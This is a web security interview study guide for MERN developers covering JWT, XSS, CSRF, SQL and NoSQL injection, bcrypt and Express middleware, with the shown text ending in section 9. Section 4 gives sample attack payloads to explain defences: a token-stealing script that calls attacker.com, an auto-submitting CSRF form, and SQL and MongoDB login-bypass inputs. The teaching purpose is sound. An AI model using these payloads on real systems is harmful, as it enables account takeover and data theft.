# Cybersecurity for MERN Stack Developers — Interview Study Guide
### Fresh Graduate Edition | Web Security for Real-World Development

---

> **Who This Guide Is For**
> MERN developers who want to write secure code, pass security-related interview questions, and avoid the most common vulnerabilities that get developers and companies into serious trouble.
>
> This guide does NOT cover penetration testing, ethical hacking, or advanced cryptography.
> It covers exactly what you need to know to get hired and build secure web applications.

---

> **How to Use This Guide**
> - Read sections 1–4 to build your security mindset.
> - Study section 4 (vulnerabilities) and section 10 (interview questions) very carefully.
> - Reference section 12 (cheat sheet) the morning of your interview.
> - Apply section 5 (secure backend) to every Express app you write from now on.

---

## Table of Contents

1. [Web Security Basics](#1-web-security-basics)
2. [Authentication vs Authorization](#2-authentication-vs-authorization)
3. [JWT Security](#3-jwt-security)
4. [Common Web Vulnerabilities](#4-common-web-vulnerabilities)
5. [Secure Backend Development in Node.js / Express](#5-secure-backend-development-in-nodejs--express)
6. [Password Security](#6-password-security)
7. [API Security Best Practices](#7-api-security-best-practices)
8. [Secure MERN Architecture](#8-secure-mern-architecture)
9. [Real-World Security Practices](#9-real-world-security-practices)
10. [Common Interview Questions](#10-common-interview-questions)
11. [Common Mistakes Fresh Developers Make](#11-common-mistakes-fresh-developers-make)
12. [Final Revision Cheat Sheet](#12-final-revision-cheat-sheet)

---

## 1. Web Security Basics

### What is Web Security?

**Web security** is the practice of protecting web applications, their data, and their users from unauthorized access, attacks, and data breaches.

Think of it this way: You build a house (your web app). Web security is the locks on your doors, the alarm system, the fence around your property, and the guard who checks IDs at the gate — all working together to keep intruders out and protect what is inside.

As a developer, security is not someone else's job. Every line of code you write either makes the application more secure or less secure. Companies expect you to write secure code from day one.

---

### Why Security Matters in Web Applications

| Consequence | Real-World Impact |
|---|---|
| Data breach | User passwords, personal data, payment info stolen |
| Financial loss | Companies pay millions in fines and legal settlements |
| Reputation damage | Users lose trust; companies lose business permanently |
| Legal liability | GDPR violations, regulatory fines, lawsuits |
| Account takeover | Attackers log in as real users, steal accounts |
| Server compromise | Attackers take over your entire infrastructure |

**Example from Pakistan:** In 2023, several Pakistani fintech and e-commerce platforms suffered data breaches because of simple, preventable security mistakes — unsanitized inputs, exposed API keys, and weak authentication. All preventable by a developer who knew the basics.

---

### Common Threats in Web Development

| Threat | What It Is | Your Layer at Risk |
|---|---|---|
| XSS | Injecting malicious scripts into pages | React / Express |
| CSRF | Tricking users into unwanted requests | Express / API |
| SQL/NoSQL Injection | Injecting code into database queries | MongoDB / Express |
| Broken Authentication | Weak login, poor token handling | Express / JWT |
| Sensitive Data Exposure | Leaking secrets, passwords, keys | All layers |
| Brute Force | Repeatedly guessing passwords | Express / Login route |
| Insecure Direct Object Reference | Accessing data that belongs to others | Express routes |
| Man-in-the-Middle | Intercepting traffic (no HTTPS) | Network / Deployment |

---

> **Key Takeaways — Section 1**
> - Security is every developer's responsibility — not just the security team's.
> - Web apps face many types of attacks — most are preventable with basic knowledge.
> - The most common vulnerabilities (XSS, injection, broken auth) are all covered in this guide.
> - Security is a topic interviewers always ask about — treat it seriously.

---

## 2. Authentication vs Authorization

### Simple Definitions

**Authentication** = Verifying WHO you are.
**Authorization** = Verifying WHAT you are allowed to do.

**Simple analogy:**
- Authentication = Showing your ID at the airport to prove you are you.
- Authorization = Showing your boarding pass to board a specific flight.

You can be authenticated (your identity is verified) but still not authorized (not allowed to access a specific resource).

---

### Real-World Examples

| Scenario | Authentication | Authorization |
|---|---|---|
| Login to an app | Prove you are the account owner (email + password) | — |
| Access admin dashboard | Already logged in | Check if your role is "admin" |
| View someone else's profile | Already logged in | Check if you own that profile |
| Delete a blog post | Already logged in | Check if you created that post |
| Change account settings | Already logged in | Check if it is YOUR account |

---

### Key Differences

| Aspect | Authentication | Authorization |
|---|---|---|
| Question it answers | "Who are you?" | "What can you do?" |
| When it happens | First (must happen before authorization) | After authentication |
| What it checks | Identity (credentials) | Permissions (roles, ownership) |
| Failure result | 401 Unauthorized | 403 Forbidden |
| Examples | Login with email/password, Google OAuth | Admin-only routes, owner-only edits |

**HTTP Status Codes:**
- `401 Unauthorized` — not authenticated (you are not logged in)
- `403 Forbidden` — authenticated but not authorized (logged in, but not allowed)

---

### In MERN Applications

```
Authentication flow:
1. User sends email + password to POST /api/auth/login
2. Express verifies credentials against MongoDB
3. If correct → Express generates JWT token
4. Client stores token → sends it with every future request

Authorization flow:
1. Request arrives at protected route with JWT in header
2. Express middleware verifies the JWT (authentication check)
3. Express checks user role/permissions (authorization check)
4. If authorized → proceed. If not → return 403 Forbidden.
```

---

> **Key Takeaways — Section 2**
> - Authentication = login (who you are). Authorization = permissions (what you can do).
> - 401 = not authenticated. 403 = authenticated but not authorized.
> - Authentication always comes BEFORE authorization in the request flow.
> - Mixing these up is one of the most common interview mistakes — know the difference cold.

---

## 3. JWT Security

### What is a JWT?

**JWT** stands for **JSON Web Token**. It is a compact, self-contained token used to securely transmit information between the client (React) and the server (Express).

When a user logs in, your server creates a JWT and sends it to the client. The client includes this token in every subsequent request. The server reads the token to know who the user is — without checking the database every time.

---

### JWT Structure

A JWT looks like this:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI2NGFiY2QiLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE2OTAwMDAsImV4cCI6MTY5MDAwMH0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

It has three parts separated by dots:

```
HEADER.PAYLOAD.SIGNATURE

Header:    { "alg": "HS256", "typ": "JWT" }
           → Base64 encoded → eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9

Payload:   { "userId": "64abcd", "role": "admin", "exp": 1690000 }
           → Base64 encoded → eyJ1c2VySWQiOiI2NGFiY2QiLCJyb2xlIjoiYWRtaW4i...

Signature: HMACSHA256(header + "." + payload, SECRET_KEY)
           → SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

**Important:**
- The payload is **Base64 encoded** — NOT encrypted. Anyone can decode it and read it.
- The signature IS what makes JWT trustworthy. Only your server (with the secret key) can produce a valid signature.
- **Never put passwords or very sensitive data in the JWT payload.**

---

### JWT Authentication Flow in MERN

```
┌─────────────────────────────────────────────────────────────────┐
│                    JWT MERN AUTH FLOW                           │
│                                                                 │
│  Step 1: Login                                                  │
│  React → POST /api/auth/login { email, password }              │
│        → Express verifies against MongoDB                       │
│        → If valid: jwt.sign({ userId, role }, SECRET, {        │
│            expiresIn: '7d' })                                   │
│        → Returns token to React                                 │
│                                                                 │
│  Step 2: Store Token                                            │
│  React stores token in httpOnly cookie (recommended)           │
│  OR localStorage (less secure — explained below)               │
│                                                                 │
│  Step 3: Authenticated Request                                  │
│  React → GET /api/profile                                       │
│          Authorization: Bearer <token>   (or sent via cookie)  │
│        → Express middleware: jwt.verify(token, SECRET)          │
│        → If valid: attach user to req.user, continue           │
│        → If invalid: return 401 Unauthorized                    │
│                                                                 │
│  Step 4: Access Granted                                         │
│  Express → MongoDB query (using req.user.userId)               │
│          → Return data to React                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

### JWT Implementation in Express

```javascript
// middleware/auth.js
const jwt = require('jsonwebtoken');

const authMiddleware = (req, res, next) => {
    try {
        // Get token from header
        const authHeader = req.headers.authorization;
        if (!authHeader || !authHeader.startsWith('Bearer ')) {
            return res.status(401).json({ message: 'No token provided' });
        }

        const token = authHeader.split(' ')[1];

        // Verify token
        const decoded = jwt.verify(token, process.env.JWT_SECRET);

        // Attach user info to request
        req.user = decoded;
        next();

    } catch (error) {
        if (error.name === 'TokenExpiredError') {
            return res.status(401).json({ message: 'Token expired, please login again' });
        }
        if (error.name === 'JsonWebTokenError') {
            return res.status(401).json({ message: 'Invalid token' });
        }
        res.status(500).json({ message: 'Authentication error' });
    }
};

module.exports = authMiddleware;
```

```javascript
// Usage: protecting any route
const authMiddleware = require('../middleware/auth');

router.get('/profile', authMiddleware, async (req, res) => {
    const user = await User.findById(req.user.userId).select('-password');
    res.json(user);
});
```

---

### Where to Store JWT Tokens — localStorage vs Cookies

This is one of the most asked security questions in interviews.

| Aspect | localStorage | httpOnly Cookie |
|---|---|---|
| XSS vulnerable? | **YES** — JavaScript can read it | **NO** — JavaScript cannot access it |
| CSRF vulnerable? | No | **YES** — needs CSRF token protection |
| Ease of use | Simple | Slightly more setup |
| Mobile apps | Common choice | Harder with native apps |
| Security recommendation | Avoid for auth tokens | Preferred for web apps |
| Accessible to JS? | Yes (`localStorage.getItem()`) | No (httpOnly blocks JS access) |

**The rule:**
- **Use `httpOnly` cookies for JWTs in web applications.**
- localStorage is easy but unsafe — a single XSS attack can steal all tokens stored there.

```javascript
// Setting JWT in httpOnly cookie (Express)
res.cookie('token', jwtToken, {
    httpOnly: true,    // JavaScript cannot access this cookie
    secure: true,      // Only sent over HTTPS (in production)
    sameSite: 'strict', // Prevents CSRF attacks
    maxAge: 7 * 24 * 60 * 60 * 1000  // 7 days in milliseconds
});
```

---

### Common JWT Security Mistakes

| Mistake | Why It's Dangerous | Fix |
|---|---|---|
| Storing JWT in localStorage | XSS can steal the token | Use httpOnly cookies |
| Weak or hardcoded secret key | Attackers can forge valid tokens | Use long random secret in .env |
| No token expiration | Stolen tokens last forever | Always set `expiresIn` |
| Sensitive data in payload | Payload is readable by anyone | Only store userId and role |
| Not verifying token signature | App trusts any token | Always call `jwt.verify()` |
| No logout mechanism | Token stays valid after logout | Implement token blacklist or short expiry |

---

> **Key Takeaways — Section 3**
> - JWT = self-contained token with header, payload (readable!), and signature.
> - Only the signature is secure — never put sensitive data in the payload.
> - Store JWTs in httpOnly cookies (not localStorage) for web apps.
> - Always set expiration (`expiresIn`). Always verify with `jwt.verify()`.
> - Use a long, random secret key stored in `.env`.

---

## 4. Common Web Vulnerabilities

### 4.1 XSS — Cross-Site Scripting

#### What is XSS?

XSS is when an attacker injects malicious JavaScript code into a web page that other users then see and execute in their browsers.

**Simple analogy:** Imagine a message board where anyone can post. An attacker posts a message that contains hidden JavaScript code. When other users view the page and the browser runs that JavaScript — the attacker's code executes in the context of those users' accounts.

---

#### How Attackers Exploit XSS

```
Attacker types this into a comment form:
<script>
  fetch('https://attacker.com/steal?token=' + localStorage.getItem('token'));
</script>

If the app displays this comment without sanitization:
- The browser renders and executes the script
- Every user who views the comment has their token stolen
- Attacker logs in as all those users
```

**Types of XSS:**
- **Stored XSS** — malicious script saved in the database, runs for everyone who views it (most dangerous)
- **Reflected XSS** — malicious script in the URL, runs for whoever clicks the link
- **DOM XSS** — malicious script injected through DOM manipulation in JavaScript

---

#### XSS Prevention in MERN Apps

**Rule 1: Never render raw HTML from user input.**
```jsx
// WRONG — executes any HTML/script the user typed
<div dangerouslySetInnerHTML={{ __html: userInput }} />

// CORRECT — React escapes HTML characters automatically
<div>{userInput}</div>
```

React automatically escapes content you render with JSX (`{variable}`). The only danger is `dangerouslySetInnerHTML` — avoid it unless absolutely necessary and you have sanitized the content.

**Rule 2: Sanitize HTML if you must render it.**
```bash
npm install dompurify
```
```javascript
import DOMPurify from 'dompurify';

// Only allow safe HTML, strip scripts
const safeHTML = DOMPurify.sanitize(userGeneratedHTML);
<div dangerouslySetInnerHTML={{ __html: safeHTML }} />
```

**Rule 3: Set Content Security Policy (CSP) headers.**
```javascript
// In Express — restricts which scripts can run
const helmet = require('helmet');
app.use(helmet());  // Sets CSP and many other security headers automatically
```

**Rule 4: Store tokens in httpOnly cookies — not localStorage.**
If tokens are in httpOnly cookies, even if XSS occurs, scripts cannot steal the tokens.

---

### 4.2 CSRF — Cross-Site Request Forgery

#### What is CSRF?

CSRF is when an attacker tricks a user's browser into making an unwanted request to a website where the user is already logged in — using the user's existing session/cookies.

**Simple analogy:** You are logged into your bank's website. You visit a malicious site. That site has a hidden form that automatically submits a transfer request to your bank — using your active session. The bank sees a valid request from your browser and executes it.

---

#### How Attackers Exploit CSRF

```
User is logged into mybank.com (has session cookie).
Attacker sends user a link to evil.com.

evil.com has this hidden form:
<form action="https://mybank.com/transfer" method="POST">
    <input name="to" value="attacker_account" />
    <input name="amount" value="50000" />
</form>
<script>document.forms[0].submit();</script>

The browser automatically includes the user's mybank.com cookie.
The bank sees a legitimate-looking authenticated request.
The transfer goes through.
```

---

#### CSRF Prevention in MERN Apps

**Method 1: Use CSRF tokens.**
```bash
npm install csurf
```
```javascript
const csrf = require('csurf');
const csrfProtection = csrf({ cookie: true });

// Add to routes that mutate data
app.post('/api/transfer', csrfProtection, (req, res) => {
    // csurf automatically validates the CSRF token
    // Only requests with a valid token from your own frontend are allowed
});
```

**Method 2: Use `SameSite` cookie attribute (modern, simpler).**
```javascript
res.cookie('token', jwtToken, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict'  // Cookie not sent on cross-site requests → blocks CSRF
});
```

**Method 3: Check the `Origin` or `Referer` header.**
```javascript
app.use((req, res, next) => {
    const origin = req.headers.origin;
    if (origin && origin !== process.env.ALLOWED_ORIGIN) {
        return res.status(403).json({ message: 'Request origin not allowed' });
    }
    next();
});
```

**Method 4: Use JWT in Authorization header (not cookies).**
CSRF does not work against Authorization headers because browsers cannot automatically include headers in cross-site requests — only cookies. If you send JWTs in the `Authorization: Bearer <token>` header from React (with Axios), you are naturally protected from CSRF.

---

### 4.3 SQL Injection

#### What is SQL Injection?

SQL Injection is when an attacker inserts malicious SQL code into a query, tricking the database into doing something unintended — like bypassing login, dumping all data, or deleting tables.

**Note for MERN developers:** You use MongoDB, not SQL. But interviewers still ask about SQL Injection because it demonstrates understanding of injection attacks in general. The concept applies to NoSQL too.

---

#### Classic SQL Injection Example

```
Login form:
Email: admin@example.com
Password: ' OR '1'='1

This becomes the SQL query:
SELECT * FROM users WHERE email='admin@example.com' AND password='' OR '1'='1'

'1'='1' is always true → attacker logs in as admin without knowing the password.
```

---

#### Prevention (SQL context)

```javascript
// WRONG — string concatenation (vulnerable)
const query = `SELECT * FROM users WHERE email = '${req.body.email}'`;

// CORRECT — parameterized queries / prepared statements
const query = 'SELECT * FROM users WHERE email = ?';
db.query(query, [req.body.email]);
// The database treats input as data, never as SQL code
```

---

### 4.4 NoSQL Injection (MongoDB Context)

#### What is NoSQL Injection?

In MongoDB, instead of SQL code, attackers inject MongoDB query operators (like `$gt`, `$where`, `$ne`) into request bodies to bypass authentication or access unauthorized data.

---

#### NoSQL Injection Attack Example

```
Attacker sends this login request body:
{
  "email": { "$gt": "" },
  "password": { "$gt": "" }
}

Mongoose/MongoDB interprets this as:
db.users.findOne({ email: { $gt: "" }, password: { $gt: "" } })

$gt: "" means "greater than empty string" → matches ALL users
→ First user in the database is returned → attacker is logged in as them
```

---

#### NoSQL Injection Prevention in MERN

**Method 1: Use `express-mongo-sanitize`.**
```bash
npm install express-mongo-sanitize
```
```javascript
const mongoSanitize = require('express-mongo-sanitize');

// Removes $ and . from request body/params/query
// Prevents MongoDB operator injection
app.use(mongoSanitize());
```

**Method 2: Validate and type-check inputs.**
```javascript
const loginUser = async (req, res) => {
    const { email, password } = req.body;

    // Ensure both are strings — not objects (which is what an injected operator would be)
    if (typeof email !== 'string' || typeof password !== 'string') {
        return res.status(400).json({ message: 'Invalid input format' });
    }

    const user = await User.findOne({ email });  // safe to use after type check
    // ...
};
```

**Method 3: Use Joi or express-validator for strict input schemas.**
```javascript
const Joi = require('joi');

const loginSchema = Joi.object({
    email: Joi.string().email().required(),    // MUST be string email format
    password: Joi.string().min(6).required()  // MUST be string, min 6 chars
});

const { error } = loginSchema.validate(req.body);
if (error) return res.status(400).json({ message: error.details[0].message });
```

---

### Vulnerability Quick Reference

| Vulnerability | Attack Vector | Prevention |
|---|---|---|
| XSS | Injecting `<script>` into rendered HTML | Escape output, DOMPurify, CSP headers, httpOnly cookies |
| CSRF | Cross-site form/request using victim's cookies | SameSite cookies, CSRF tokens, JWT in Authorization header |
| SQL Injection | Malicious SQL in form inputs | Parameterized queries, ORMs |
| NoSQL Injection | MongoDB operators in JSON body | express-mongo-sanitize, type validation, Joi |

---

> **Key Takeaways — Section 4**
> - XSS = attacker runs JavaScript in your users' browsers. Fix: escape output, httpOnly cookies, CSP.
> - CSRF = attacker tricks browser into making requests using active session. Fix: SameSite cookies, CSRF tokens.
> - SQL Injection = malicious SQL in inputs. Fix: parameterized queries (never string concatenation).
> - NoSQL Injection = MongoDB operators in JSON body. Fix: express-mongo-sanitize, type validation.
> - All injection attacks share the same root cause: treating user input as trusted code.

---

## 5. Secure Backend Development in Node.js / Express

### Auth Middleware — Protecting Routes

Every route that requires a logged-in user must go through your auth middleware.

```javascript
// middleware/auth.js
const jwt = require('jsonwebtoken');

const protect = (req, res, next) => {
    const authHeader = req.headers.authorization;
    if (!authHeader?.startsWith('Bearer ')) {
        return res.status(401).json({ message: 'Not authenticated' });
    }
    try {
        const token = authHeader.split(' ')[1];
        req.user = jwt.verify(token, process.env.JWT_SECRET);
        next();
    } catch {
        res.status(401).json({ message: 'Invalid or expired token' });
    }
};

module.exports = protect;
```

```javascript
// Apply to a route
router.get('/dashboard', protect, dashboardController);
router.delete('/post/:id', protect, deletePostController);
```

---

### Input Validation with express-validator

Never trust data from the client. Always validate server-side.

```bash
npm install express-validator
```

```javascript
const { body, validationResult } = require('express-validator');

const registerValidation = [
    body('email')
        .isEmail().withMessage('Must be a valid email')
        .normalizeEmail(),

    body('password')
        .isLength({ min: 8 }).withMessage('Password must be at least 8 characters')
        .matches(/[A-Z]/).withMessage('Must contain uppercase letter')
        .matches(/[0-9]/).withMessage('Must contain a number'),

    body('name')
        .trim()
        .isLength({ min: 2, max: 50 }).withMessage('Name must be 2–50 characters')
        .escape()  // removes HTML characters — prevents XSS
];

const register = async (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
        return res.status(400).json({ errors: errors.array() });
    }
    // proceed with registration
};

router.post('/register', registerValidation, register);
```

---

### Sanitizing User Data

Sanitization removes or encodes dangerous characters from user input BEFORE processing or storing it.

```bash
npm install express-mongo-sanitize xss-clean
```

```javascript
const mongoSanitize = require('express-mongo-sanitize');
const xssClean = require('xss-clean');

// Remove MongoDB operators ($, .) from request data
app.use(mongoSanitize());

// Sanitize user input against XSS (encodes HTML in req.body, req.query)
app.use(xssClean());
```

---

### Protecting Routes — Security Middleware Stack

```javascript
// server.js — recommended middleware order
const express = require('express');
const helmet = require('helmet');
const cors = require('cors');
const mongoSanitize = require('express-mongo-sanitize');
const xssClean = require('xss-clean');
const rateLimit = require('express-rate-limit');

const app = express();

// 1. Security headers (XSS protection, no-sniff, etc.)
app.use(helmet());

// 2. CORS — only allow your frontend origin
app.use(cors({
    origin: process.env.FRONTEND_URL,
    credentials: true
}));

// 3. Body parsing
app.use(express.json({ limit: '10kb' }));  // limit body size (prevents DoS)

// 4. Input sanitization
app.use(mongoSanitize());
app.use(xssClean());

// 5. Rate limiting
const globalLimiter = rateLimit({
    windowMs: 15 * 60 * 1000,  // 15 minutes
    max: 100,
    message: 'Too many requests, please try again later'
});
app.use('/api', globalLimiter);

// 6. Routes
app.use('/api/auth', require('./routes/authRoutes'));
app.use('/api/users', require('./routes/userRoutes'));
```

---

### Role-Based Access Control (RBAC)

RBAC restricts what different types of users can do. Common roles: `user`, `admin`, `moderator`.

```javascript
// middleware/authorize.js
const authorize = (...allowedRoles) => {
    return (req, res, next) => {
        // req.user must be set by auth middleware first
        if (!req.user) {
            return res.status(401).json({ message: 'Not authenticated' });
        }
        if (!allowedRoles.includes(req.user.role)) {
            return res.status(403).json({ message: 'Access denied — insufficient permissions' });
        }
        next();
    };
};

module.exports = authorize;
```

```javascript
const protect = require('../middleware/auth');
const authorize = require('../middleware/authorize');

// Only logged-in users
router.get('/profile', protect, profileController);

// Only admins
router.delete('/user/:id', protect, authorize('admin'), deleteUserController);

// Admins and moderators
router.patch('/post/:id/approve', protect, authorize('admin', 'moderator'), approvePostController);
```

---

> **Key Takeaways — Section 5**
> - Use `helmet()` — one line that sets 10+ security headers automatically.
> - Validate ALL input server-side with express-validator.
> - Sanitize inputs with `express-mongo-sanitize` and `xss-clean`.
> - Auth middleware → Authorization middleware → Route handler (this order always).
> - RBAC: store role in JWT, check it in authorize middleware.

---

## 6. Password Security

### Why We NEVER Store Plain Passwords

If your database is breached and passwords are stored as plain text, every single user's password is immediately exposed. Those users likely use the same password on Gmail, their bank, and other sites.

**Plain text = catastrophic breach.**

Even storing MD5 or SHA1 hashes is dangerous because:
- They are fast to compute — attackers can try billions of guesses per second
- Rainbow table attacks — pre-computed lists of hashes for common passwords

---

### What is Password Hashing?

**Hashing** converts a password into a fixed-length string that cannot be reversed back to the original password.

**bcrypt** is the industry-standard hashing algorithm for passwords because:
- It is intentionally slow (configurable work factor) — makes brute force impractical
- It automatically adds a **salt** — random data added before hashing, so identical passwords produce different hashes
- It is one-way — you cannot recover the original password from the hash

---

### bcrypt in Node.js

```bash
npm install bcryptjs
```

```javascript
const bcrypt = require('bcryptjs');

// ─── REGISTERING A USER ───────────────────────────────────────────
const register = async (req, res) => {
    const { email, password } = req.body;

    // Check if user already exists
    const exists = await User.findOne({ email });
    if (exists) return res.status(400).json({ message: 'Email already registered' });

    // Hash the password
    const saltRounds = 12;              // higher = slower = more secure (10-12 is standard)
    const hashedPassword = await bcrypt.hash(password, saltRounds);

    // Store hashed password (NEVER the original)
    const user = await User.create({
        email,
        password: hashedPassword        // stored as: "$2a$12$K7RXEGfh..."
    });

    res.status(201).json({ message: 'Account created' });
};


// ─── LOGGING IN A USER ────────────────────────────────────────────
const login = async (req, res) => {
    const { email, password } = req.body;

    const user = await User.findOne({ email });
    if (!user) return res.status(401).json({ message: 'Invalid email or password' });

    // Compare the plain password against the stored hash
    const isMatch = await bcrypt.compare(password, user.password);
    if (!isMatch) return res.status(401).json({ message: 'Invalid email or password' });

    // Generate JWT
    const token = jwt.sign(
        { userId: user._id, role: user.role },
        process.env.JWT_SECRET,
        { expiresIn: '7d' }
    );

    res.json({ token });
};
```

---

### Password Security Rules

| Rule | Reason |
|---|---|
| Always hash with bcrypt (min cost factor 10) | Slows brute force attacks dramatically |
| Never log passwords | Logs are often less secure than the database |
| Return generic error messages at login | "Invalid email or password" — don't reveal which is wrong |
| Enforce minimum password strength | At least 8 chars, mix of letters and numbers |
| Never store password hints or answers | These can be used to bypass the password |
| Hash on the backend — never frontend | Frontend hashing gives false security |

---

> **Key Takeaways — Section 6**
> - NEVER store plain text passwords — ever. This is a fireable offense.
> - Use `bcryptjs` — hash with `bcrypt.hash()`, verify with `bcrypt.compare()`.
> - Salt rounds of 10–12 is the standard. Higher = more secure but slower.
> - Always return the same error message for wrong email OR wrong password (don't hint which).

---

## 7. API Security Best Practices

### CORS — Cross-Origin Resource Sharing

**CORS** is a browser security mechanism that controls which domains are allowed to make requests to your API.

Without CORS configuration, any website on the internet could make requests to your API using your users' credentials.

```javascript
const cors = require('cors');

// WRONG — allows every website to call your API
app.use(cors());

// CORRECT — only your frontend can call your API
app.use(cors({
    origin: process.env.FRONTEND_URL,   // e.g., 'https://myapp.com'
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'],
    credentials: true                   // allows cookies to be sent cross-origin
}));
```

**CORS only protects against browser-based requests.** It does NOT prevent Postman or server-to-server requests. For API protection, you still need authentication.

---

### Rate Limiting

Rate limiting restricts how many requests a client can make in a given time window. This prevents:
- Brute force attacks on login endpoints
- API abuse and DoS attacks
- Excessive AI API costs (covered in the AI guide)

```javascript
const rateLimit = require('express-rate-limit');

// Strict rate limit for authentication routes
const authLimiter = rateLimit({
    windowMs: 15 * 60 * 1000,  // 15 minutes
    max: 10,                    // max 10 login attempts per 15 minutes
    message: { message: 'Too many login attempts. Please try again in 15 minutes.' },
    standardHeaders: true
});

app.use('/api/auth/login', authLimiter);
app.use('/api/auth/forgot-password', authLimiter);

// Relaxed rate limit for general API
const generalLimiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 200
});
app.use('/api', generalLimiter);
```

---

### Environment Variables — Never Expose Secrets

```javascript
// .env file (never commit this to GitHub)
JWT_SECRET=my_super_long_random_secret_key_that_nobody_can_guess_abc123xyz
MONGODB_URI=mongodb+srv://username:password@cluster.mongodb.net/mydb
OPENAI_API_KEY=sk-proj-xxxxxxxxxxxxxxxxxxxx
STRIPE_SECRET_KEY=sk_live_xxxxxxxxxxxxxxxxxx

// Access in Node.js
require('dotenv').config();
const secret = process.env.JWT_SECRET;
```

```
// .gitignore — always include these
.env
.env.local
.env.production
node_modules/
```

**What happens if secrets are committed to GitHub:**
- GitHub scans public repos and alerts companies whose keys are found
- Attackers scan GitHub for exposed keys (bots do this 24/7)
- OpenAI and AWS will suspend your account and may charge you for unauthorized usage
- MongoDB Atlas databases can be wiped

---

### Never Expose Secrets in Frontend

```javascript
// WRONG — visible in browser source code
const API_KEY = "sk-proj-xxxxxxxxxxxxxxxxx";  // in React code
fetch(`https://api.openai.com/...`, {
    headers: { Authorization: `Bearer ${API_KEY}` }
});

// CORRECT — React calls your backend, backend calls the external API
// React:
const response = await axios.post('/api/ai/chat', { message });

// Express backend (key stays hidden from browser):
const aiResponse = await openai.chat.completions.create({
    ...  // process.env.OPENAI_API_KEY is used here, never exposed
});
```

---

> **Key Takeaways — Section 7**
> - Configure CORS to only allow your frontend's domain.
> - Rate limit login and password-reset endpoints aggressively (max 10 attempts per 15 min).
> - All secrets go in `.env`. Always add `.env` to `.gitignore` before first commit.
> - Secret keys accessed via external APIs must ONLY be used on the backend.

---

## 8. Secure MERN Architecture

### The Three-Layer Security Model

Security in a MERN application is applied at every layer — not just one.

```
┌────────────────────────────────────────────────────────────────────────┐
│                    SECURE MERN ARCHITECTURE                            │
│                                                                        │
│  ┌─────────────────────────────────────────────────────────────┐      │
│  │  LAYER 1: REACT FRONTEND                                    │      │
│  │  Security applied here:                                     │      │
│  │  ✓ Never store JWT in localStorage (use httpOnly cookies)   │      │
│  │  ✓ Never put API keys in React code                         │      │
│  │  ✓ Use JSX rendering (auto-escapes HTML → prevents XSS)     │      │
│  │  ✓ Validate form inputs client-side (UX, not security)      │      │
│  │  ✓ Use HTTPS for all API calls                              │      │
│  └───────────────────────────┬─────────────────────────────────┘      │
│                              │ HTTPS                                   │
│                              ▼                                         │
│  ┌─────────────────────────────────────────────────────────────┐      │
│  │  LAYER 2: EXPRESS BACKEND (Main Security Layer)             │      │
│  │  Security applied here:                                     │      │
│  │  ✓ helmet() — security headers (XSS, clickjacking, etc.)   │      │
│  │  ✓ cors() — restrict allowed origins                        │      │
│  │  ✓ express-rate-limit — prevent brute force                 │      │
│  │  ✓ express-mongo-sanitize — prevent NoSQL injection         │      │
│  │  ✓ xss-clean — sanitize inputs against XSS                 │      │
│  │  ✓ express-validator — validate all inputs                  │      │
│  │  ✓ JWT auth middleware — verify every protected request     │      │
│  │  ✓ RBAC middleware — check roles/permissions                │      │
│  │  ✓ bcryptjs — hash passwords                               │      │
│  │  ✓ .env — all secrets hidden from code                     │      │
│  └───────────────────────────┬─────────────────────────────────┘      │
│                              │ Authenticated queries only              │
│                              ▼                                         │
│  ┌─────────────────────────────────────────────────────────────┐      │
│  │  LAYER 3: MONGODB DATABASE                                  │      │
│  │  Security applied here:                                     │      │
│  │  ✓ Mongoose validation — schema-level data type enforcement │      │
│  │  ✓ Never expose _id of other users in responses            │      │
│  │  ✓ Select('-password') — never send hashed password to UI  │      │
│  │  ✓ MongoDB Atlas — IP whitelist, no public access           │      │
│  │  ✓ Strong database password, not default                   │      │
│  └─────────────────────────────────────────────────────────────┘      │
└────────────────────────────────────────────────────────────────────────┘
```

---

### Request Lifecycle with Security Checks

```
Incoming Request → React → HTTPS → Express

Express processes in order:
1. helmet()               — sets security headers
2. cors()                 — checks if origin is allowed
3. rateLimit()            — checks request count (is this a bot?)
4. express.json()         — parses body (limit: 10kb)
5. mongoSanitize()        — removes $ and . from body
6. xssClean()             — sanitizes HTML in body
7. authMiddleware         — verifies JWT (is user logged in?)
8. authorize('admin')     — checks role (is user allowed here?)
9. express-validator      — validates specific input fields
10. Controller            — actual business logic runs
11. Mongoose              — schema validation before DB write
12. Response              — .select('-password') excludes sensitive fields
```

---

### Security Package Summary

| Package | Purpose | Install |
|---|---|---|
| `helmet` | Sets 10+ security HTTP headers | `npm i helmet` |
| `cors` | Controls allowed origins | `npm i cors` |
| `express-rate-limit` | Rate limiting | `npm i express-rate-limit` |
| `express-mongo-sanitize` | Prevents NoSQL injection | `npm i express-mongo-sanitize` |
| `xss-clean` | Sanitizes XSS in inputs | `npm i xss-clean` |
| `express-validator` | Input validation | `npm i express-validator` |
| `bcryptjs` | Password hashing | `npm i bcryptjs` |
| `jsonwebtoken` | JWT creation and verification | `npm i jsonwebtoken` |
| `dotenv` | Environment variables | `npm i dotenv` |

---

> **Key Takeaways — Section 8**
> - Security is a three-layer responsibility: React, Express, and MongoDB all play a role.
> - Express is where most security middleware lives — this is your primary defense layer.
> - MongoDB security: always use `.select('-password')`, use Atlas IP whitelisting.
> - Install and configure all 9 security packages in every MERN project.

---

## 9. Real-World Security Practices

### Secure Login / Register Flow

```javascript
// ─── REGISTER ────────────────────────────────────────────────────
// POST /api/auth/register
// 1. Validate inputs (email, password strength)
// 2. Check if email already exists
// 3. Hash password with bcrypt
// 4. Create user in MongoDB (store hashed password)
// 5. Return success (do NOT auto-login — force them to verify email in production)

// ─── LOGIN ───────────────────────────────────────────────────────
// POST /api/auth/login
// 1. Validate inputs exist and are strings
// 2. Find user by email (handle not found without revealing which field is wrong)
// 3. Compare password with bcrypt.compare()
// 4. If mismatch → return generic "Invalid email or password"
// 5. Generate JWT: { userId, role }, signed with JWT_SECRET, expires in 7d
// 6. Set JWT in httpOnly cookie OR return in response body
// 7. Return user data (EXCLUDE password field: .select('-password'))

